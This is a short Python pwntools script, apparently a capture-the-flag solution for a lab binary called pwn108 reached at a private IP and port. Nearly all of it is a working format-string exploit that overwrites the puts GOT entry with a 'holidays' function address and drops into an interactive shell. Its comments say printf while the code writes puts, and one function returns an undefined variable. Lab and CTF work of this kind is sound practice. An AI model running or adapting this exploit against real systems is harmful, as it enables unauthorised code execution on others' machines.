from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload

def send_payload(payload):              # send payload to retrieve offset
    #p = process(exe)
    p = remote('10.10.149.41', 9008)
    p.recvuntil(b']: ')
    p.sendline(b'test')
    p.recvuntil(b']: ')
    p.sendline(payload)
    p.recvuntil(b'Register no  : ')
    ret = p.recvline()                  # return response
    p.close()
    return ret

def fmt_payload(payload):               # send payload to exploit binary
    #p = process(exe)
    p = remote('10.10.149.41', 9008)
    p.recvuntil(b']: ')
    p.sendline(b'test')
    p.recvuntil(b']: ')
    p.sendline(payload)
    p.interactive()                     # wait for shell
    return ret

exe = './pwn108'
elf = context.binary = ELF(exe, checksec=False)         # wont exec checksec
#context.log_level = 'debug'                             # a lot of debug info

# ASLR OFF > echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# ASLR ON  > echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
#format_string = FmtStr(execute_fmt=send_payload)        # will auto exec and look for offset
#info("format string offset: %d", format_string.offset)  # print offset founded

# Print address to overwrite (printf) and what we want to write (ret2win)
info("address to overwrite (elf.got.printf): %#x", elf.got.printf)
info("address to write (elf.symbols.holidays): %#x", elf.symbols.holidays)

format_string = FmtStr(execute_fmt=fmt_payload, offset=10)  # use a custom payload to retrieve shell 
format_string.write(elf.got.puts, elf.symbols.holidays)     # rewrite printf addr by function addr
format_string.execute_writes()                              # exec fmt string

